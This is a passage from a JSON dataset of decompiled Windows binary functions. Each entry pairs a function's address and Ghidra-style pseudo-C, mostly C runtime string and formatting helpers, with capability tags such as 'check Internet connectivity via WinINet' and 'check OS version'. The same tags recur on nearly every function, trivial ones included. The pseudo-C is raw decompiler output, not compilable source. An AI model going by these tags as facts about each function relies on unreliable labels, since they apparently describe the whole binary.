*puVar6;\n                        *(unaff_EBP + 0x10) = uVar8;\n                        uVar8 = fcn.00405b64();\n                        fcn.0040665e(uVar8);\n                        iVar9 = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            iVar9 = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = (*(unaff_EBP + 0x34) - uVar5) + iVar9;\n                        var_28h = *(unaff_EBP + 0x10);\n                        iVar7 = unaff_EBP + -0xd4;\n                        uVar10 = uVar5;\n                    }\n                    goto code_r0x00480394;\n                }\n                if (cVar11 == 'x') goto code_r0x00480403;\n            }\n        }\ncode_r0x00480434:\n        uVar10 = *(unaff_EBP + -0x7c) + 1;\n        *(unaff_EBP + -0x7c) = uVar10;\n        if (3 < uVar10) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar7 = unaff_EBP + -0x28;\n                if (0xf < *(unaff_EBP + -0x14)) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                piVar4 = fcn.00405155(unaff_EBP + -0xac, var_28h, iVar9, iVar7 + 1, *(unaff_EBP + -0x18) - 1);\n                var_28h = *piVar4;\n                iVar9 = piVar4[1];\n                *(unaff_EBP + 0xc) = var_28h;\n                *(unaff_EBP + 0x10) = iVar9;\n            }\n            iVar7 = *(unaff_EBP + -0x98);\n            uVar8 = *(unaff_EBP + -0x8c);\n            uVar2 = *(unaff_EBP + -0xa4);\n            *(iVar7 + 0x20) = 0;\n            *(iVar7 + 0x24) = 0;\n            fcn.00406631(uVar2, var_28h, iVar9, uVar8, arg_18h_00);\n            if (0xf < *(unaff_EBP + -0x2c)) {\n                uVar8 = *(unaff_EBP + -0x40);\n                uVar5 = *(unaff_EBP + -0x2c) + 1;\n                *(unaff_EBP + -0x7c) = uVar5;\n                *(unaff_EBP + -0x84) = uVar8;\n                if (0xfff < uVar5) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar8 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar8);\n            }\n            *(unaff_EBP + -0x30) = 0;\n            *(unaff_EBP + -0x2c) = 0xf;\n            *(unaff_EBP + -0x40) = 0;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                uVar8 = *(unaff_EBP + -0x28);\n                uVar5 = *(unaff_EBP + -0x14) + 1;\n                *(unaff_EBP + -0x7c) = uVar5;\n                *(unaff_EBP + -0x84) = uVar8;\n                if (0xfff < uVar5) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar8 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar8);\n            }\n            *(unaff_EBP + -0x18) = 0;\n            *(unaff_EBP + -0x14) = 0xf;\n            *(unaff_EBP + -0x28) = 0;\n            fcn.004029b9();\n            fcn.004029b9();\n            fcn.004067d0();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4894
    },
    "00405eb1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405eb1(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h == 0) {\n        iVar3 = 0;\n    }\n    else {\n        fcn.004057e5(arg_14h);\n        if (*(var_10h + 0xa8) == 0) {\n            iVar3 = fcn.004022b6(arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            do {\n                var_4h = fcn.00403616(*arg_8h, &var_10h);\n                var_4h = var_4h & 0xffff;\n                arg_8h = arg_8h + 1;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uVar4 = fcn.00403616(uVar1, &var_10h);\n                iVar3 = var_4h - (uVar4 & 0xffff);\n                if ((iVar3 != 0) || (var_4h == 0)) break;\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n        }\n        if (var_8h != '\\0') {\n            *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 528
    },
    "00405ec5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405ec5(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((arg_8h != 0) && (arg_ch != NULL)) {\n        uVar2 = fcn.0040461f(arg_8h, *arg_ch, arg_ch[1], 0);\n        return uVar2;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 134
    },
    "00405ee3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405ee3(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 333
    },
    "00405eed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405eed(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00402b58(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 199
    },
    "00405ef7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405ef7(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    float10 fVar3;\n    double dVar4;\n    \n    puVar2 = fcn.004039a4();\n    uVar1 = *puVar2;\n    *puVar2 = 0;\n    fVar3 = fcn.004023a1(arg_8h, arg_ch);\n    dVar4 = fVar3;\n    *arg_14h = *puVar2;\n    *puVar2 = uVar1;\n    if (arg_10h != 0) {\n        fVar3 = fcn.00402c57(dVar4, arg_10h);\n        fVar3 = fVar3 * dVar4;\n    }\n    return fVar3;\n}\n",
        "token_count": 203
    },
    "00405f01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00405f01(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != '\\0') {\n        return 0x1fffffffffffff;\n    }\n    return 0xffffff;\n}\n",
        "token_count": 53
    },
    "00405f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405f60(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "00405f9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f9c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch != 0) {\n        do {\n            if (*(*(arg_8h + -1 + arg_ch) + 0x54d858) == '\\0') {\n                return;\n            }\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00405fdd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fdd(int32_t arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_14h;\n    uint uVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040314d(arg_8h, 0, 0x1ca);\n    if (*arg_ch != 0) {\n        if ((*arg_ch != 0x2e) || (arg_ch[1] == 0)) {\n            var_4h = 0;\n            arg_14h = fcn.0040369d(arg_ch, 0x5509b8);\n            do {\n                if (arg_14h == 0) {\n                    return 0xffffffff;\n                }\n                iVar1 = arg_ch[arg_14h];\n                if (var_4h == 0) {\n                    if (0x3f < arg_14h) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = fcn.00405a92(arg_8h, 0x40, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x004abb66;\n                    if (iVar1 == 0x2e) {\n                        var_4h = 1;\n                    }\n                }\n                else {\n                    if (var_4h == 1) {\n                        if (0x3f < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if (iVar1 == 0x5f) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x40;\n                        iVar3 = arg_8h + 0x80;\n                    }\n                    else {\n                        if (var_4h != 2) {\n                            return 0xffffffff;\n                        }\n                        if (0xf < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if ((iVar1 != 0) && (iVar1 != 0x2c)) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x10;\n                        iVar3 = arg_8h + 0x100;\n                    }\n                    iVar3 = fcn.00405a92(iVar3, uVar4, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x004abb66;\n                }\n                if (iVar1 == 0x2c) {\n                    return 0;\n                }\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                arg_ch = arg_ch + arg_14h + 1;\n                var_4h = var_4h + 1;\n                arg_14h = fcn.0040369d(arg_ch, 0x5509b8);\n            } while( true );\n        }\n        iVar3 = fcn.00405a92(arg_8h + 0x100, 0x10, arg_ch + 1, 0xf);\n        if (iVar3 != 0) {\ncode_r0x004abb66:\n            fcn.004035f8(0, 0, 0, 0, 0);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        *(arg_8h + 0x11e) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 767
    },
    "00406041": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00406041(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t arg_18h_00;\n    int32_t unaff_EBP;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t arg_1ch_00;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar2 = *(unaff_EBP + 0x18);\n    pcVar10 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = iVar2;\n    *(unaff_EBP + -0x44) = pcVar10;\n    if ((uVar8 == 0) || ((*pcVar10 != '+' && (*pcVar10 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if (((((*(iVar2 + 0x14) & 0xe00) == 0x800) && (arg_1ch_00 + 2 <= uVar8)) && (pcVar10[arg_1ch_00] == '0')) &&\n       ((pcVar10[arg_1ch_00 + 1] == 'x' || (pcVar10[arg_1ch_00 + 1] == 'X')))) {\n        arg_1ch_00 = arg_1ch_00 + 2;\n    }\n    fcn.0040327e(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00403d87(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar5;\n    fcn.004050a6();\n    fcn.004060c8(uVar8, 0);\n    iVar11 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar11 = *(unaff_EBP + -0x28);\n    }\n    fcn.0040110e(*(unaff_EBP + -0x44), uVar8 + *(unaff_EBP + -0x44), iVar11);\n    fcn.0040327e(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00404a89(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar6;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x40);\n    (*pcVar3)();\n    pcVar10 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar10 = *(unaff_EBP + -0x40);\n    }\n    if ((*pcVar10 != '\\x7f') && ('\\0' < *pcVar10)) {\n        uVar7 = fcn.00405691();\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x48) = uVar7;\n        while (((cVar1 = *pcVar10,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_00))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.00404133(uVar8, 1, uVar7);\n            if ('\\0' < pcVar10[1]) {\n                pcVar10 = pcVar10 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x48);\n        }\n    }\n    iVar2 = *(unaff_EBP + -0x58);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x48) = uVar8;\n    if (((*(iVar2 + 0x24) < 0) || ((*(iVar2 + 0x24) < 1 && (*(iVar2 + 0x20) == 0)))) || (*(iVar2 + 0x20) <= uVar8)) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = *(iVar2 + 0x20) - uVar8;\n    }\n    uVar8 = *(iVar2 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar5 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            arg_18h_00 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                arg_18h_00 = *(unaff_EBP + -0x28);\n            }\n            puVar9 = fcn.00402527(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                  arg_18h_00, arg_1ch_00);\n            uVar5 = *puVar9;\n            uVar4 = puVar9[1];\n            *(unaff_EBP + 0x14) = uVar4;\n            *(unaff_EBP + 0x10) = uVar5;\n            puVar9 = fcn.00405a47(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, uVar4, *(unaff_EBP + 0x1c), iVar11);\n            iVar11 = 0;\n            goto code_r0x0047381c;\n        }\n        puVar9 = fcn.00405a47(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar11);\n        iVar11 = 0;\n        uVar5 = *puVar9;\n        var_2ch = puVar9[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar5;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar9 = fcn.00402527(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, var_2ch, var_28h, arg_1ch_00);\ncode_r0x0047381c:\n    uVar5 = puVar9[1];\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    *(unaff_EBP + 0x14) = uVar5;\n    *(unaff_EBP + -0x44) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar9 = fcn.00402527(noname_0, unaff_EBP + -0x5c, uVar4, uVar5, *(unaff_EBP + -0x44) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x48) - arg_1ch_00);\n    uVar5 = *(unaff_EBP + 0x1c);\n    uVar4 = *(unaff_EBP + -0x54);\n    arg_10h_00 = *puVar9;\n    arg_14h_00 = puVar9[1];\n    *(iVar2 + 0x20) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00405a47(noname_0, uVar4, arg_10h_00, arg_14h_00, uVar5, iVar11);\n    fcn.004029b9();\n    fcn.00402c34();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 2501
    },
    "0040605f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040605f(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 341
    },
    "00406073": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406073(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            uVar2 = fcn.00403751();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.00403819(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "0040609b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040609b(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004060a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004060a0(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.00401708(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00404043(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 392
    },
    "004060d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004060d2(uint16_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    int32_t iVar6;\n    int32_t arg_8h_00;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = *arg_ch;\n    if (arg_8h == NULL) {\n        iVar2 = 0;\n        while( true ) {\n            uVar1 = fcn.004d65ef(arg_8h_00);\n            iVar6 = fcn.00404d2c(0, arg_8h_00, uVar1, arg_14h);\n            if (iVar6 == -1) break;\n            if (iVar6 == 0) {\n                return iVar2;\n            }\n            if (iVar6 == 4) {\n                iVar2 = iVar2 + 1;\n            }\n            arg_8h_00 = arg_8h_00 + iVar6;\n            iVar2 = iVar2 + 1;\n        }\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x2a;\n    }\n    else {\n        puVar5 = arg_8h;\n        var_8h = in_ECX;\n        if (arg_10h != 0) {\n            do {\n                uVar1 = fcn.004d65ef(arg_8h_00);\n                iVar2 = fcn.00404d2c(&var_8h, arg_8h_00, uVar1, arg_14h);\n                if (iVar2 == -1) {\n                    *arg_ch = arg_8h_00;\n                    puVar3 = fcn.004039a4();\n                    *puVar3 = 0x2a;\n                    return -1;\n                }\n                if (iVar2 == 0) {\n                    arg_8h_00 = 0;\n                    *puVar5 = 0;\n                    break;\n                }\n                uVar4 = var_8h;\n                if (0xffff < var_8h) {\n                    if (arg_10h < 2) break;\n                    var_8h = var_8h - 0x10000;\n                    arg_10h = arg_10h - 1;\n                    *puVar5 = var_8h >> 10 | 0xd800;\n                    puVar5 = puVar5 + 1;\n                    uVar4 = var_8h & 0x3ff | 0xdc00;\n                }\n                *puVar5 = uVar4;\n                arg_8h_00 = arg_8h_00 + iVar2;\n                puVar5 = puVar5 + 1;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n        }\n        iVar6 = puVar5 - arg_8h >> 1;\n        *arg_ch = arg_8h_00;\n    }\n    return iVar6;\n}\n",
        "token_count": 737
    },
    "004060fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
